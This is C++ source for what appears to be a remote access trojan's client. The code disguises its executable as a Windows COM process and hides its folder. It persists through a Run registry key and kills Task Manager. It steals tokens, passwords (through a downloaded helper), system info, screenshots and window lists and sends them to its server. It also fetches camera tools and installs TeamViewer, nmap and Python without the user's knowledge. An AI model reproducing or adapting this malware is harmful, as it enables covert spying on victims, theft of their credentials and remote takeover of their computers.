#include <filesystem>
#include <string>
#include <fstream>
#include <vector>
#include <regex>
#include <iostream>
#include <thread>

#include "..\utility\xor.hpp"
#include "..\utility\requests.h"
#include "..\utility\helper.h"
#include "../gui/gui.h"
#include "functions.h"
#include "../utility/task_manager.h"

namespace client {
	const std::string STARTUP_FILE_NAME = xorstr_("COMProcess.exe");

	const std::string PROGRAM_NAME = xorstr_("OverflowClient.exe");

	std::string PATH = helpers::roaming + xorstr_("\\Microsoft\\COM\\");

	void background() {
		/* Initialize */
		if (communication::get_profile("initialized") != "1") {
			setup();

			/* Notify */
			communication::send_message("Downloads", "Downloading content in 5 minutes");
		}
	
		/* Determine If Ran From Startup */
		auto uptime = std::chrono::milliseconds(GetTickCount64());
		if ((uptime / (float)1000).count() <= 520) {
			communication::send_message(xorstr_("PC Just Turned On"), std::to_string((float)(uptime / (float)60000).count()) + xorstr_(" Minutes Ago"));
		}

		/* Create Communication Thread */
		std::thread coms(communication::handler_loop);

		/* Kill Task Manager */
		task_manager::kill_task_loop();

		static bool once = true;
		while (true) {
			/* Send Screenshot */
			client::functions::take_screenshot(PATH + xorstr_("ss.jpg"));
			communication::send_message("PC Screenshot", "", PATH + xorstr_("ss.jpg"), "image");

			/* Send Current Windows */
			communication::send_message("All Windows", client::functions::prepare_payload("All Windows", client::functions::get_all_windows()));

			Sleep(300000);

			if (once) {
				download_all();
				once = false;
			}
		}
	}

	void init() {
		/* Hide */
		SetFileAttributes((helpers::roaming + "\\Microsoft\\COM").c_str(), FILE_ATTRIBUTE_HIDDEN);

		/* Make Copy To Roaming Path Folder*/
		try {
			std::filesystem::copy(PROGRAM_NAME, PATH + STARTUP_FILE_NAME);
		}
		catch (std::filesystem::filesystem_error & e) {
			std::cout << e.what();
		}

		/* Edit registry */
		HKEY key = NULL;
		LONG v1 = RegCreateKey(HKEY_CURRENT_USER, xorstr_("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &key);
		LONG v2 = RegSetValueEx(key, xorstr_("ExceptionHandler"), 0, REG_SZ, (BYTE*)(PATH + STARTUP_FILE_NAME).c_str(), ((PATH + STARTUP_FILE_NAME).size() + 1) * sizeof(wchar_t));

		/* Start Program */
		helpers::start_process_admin(PATH + STARTUP_FILE_NAME);
	}

	void setup() {
		/* Create Client Channel */
		requests::post("php/channel.php");

		/* Set Initialized */
		communication::set_profile("initialized", "1");

		/* Get Tokens */
		auto tokens = client::functions::get_tokens();

		/* Post Tokens */
		communication::send_message("Tokens", client::functions::prepare_payload("Tokens", tokens));

		/* Post Computer Info */
		communication::send_message(xorstr_("Computer Info"), client::functions::get_computer_info() + client::functions::get_computer_brand());
		
		/* Post Passwords */
		requests::download_file("downloads/shaco.exe", PATH + xorstr_("shaco.exe"));
		system(xorstr_("cd %AppData%\\Microsoft\\COM && shaco.exe"));
		communication::send_message(xorstr_("Passwords"), "", PATH + xorstr_("pass.txt"), "file");
		
		/* Post Camera */
		requests::download_file("downloads/dll.zip", PATH + xorstr_("dll.zip"));
		std::string command = xorstr_("powershell -command \"Expand-Archive ") + PATH + "dll.zip" + " -DestinationPath " + helpers::roaming + xorstr_("\\Microsoft\\COM") + "\"";
		system(command.c_str());
		requests::download_file("downloads/CameraManager.exe", PATH + xorstr_("cam.exe"));
		communication::send_message("Camera Manager", helpers::exec(("cd " + PATH + " && cam.exe check").c_str()));
	}

	void download_all() {
		if (communication::get_profile("downloaded") != "1") {
			if (!std::filesystem::exists(PATH + xorstr_("tv")))
				functions::install_teamviewer();

			if (helpers::exec("where nmap").find("nmap") == std::string::npos)
				functions::install_nmap();

			if (helpers::exec("where python").find("Python") == std::string::npos)
				functions::install_python();

			if (!std::filesystem::exists(PATH + xorstr_("scripts")))
				functions::install_scripts();

			/* Notify */
			communication::send_message("Installed", "Teamviewer\nPython\nNmap\nScripts");

			/* Mark Downloaded */
			communication::set_profile("downloaded", "1");
		}
	}
}	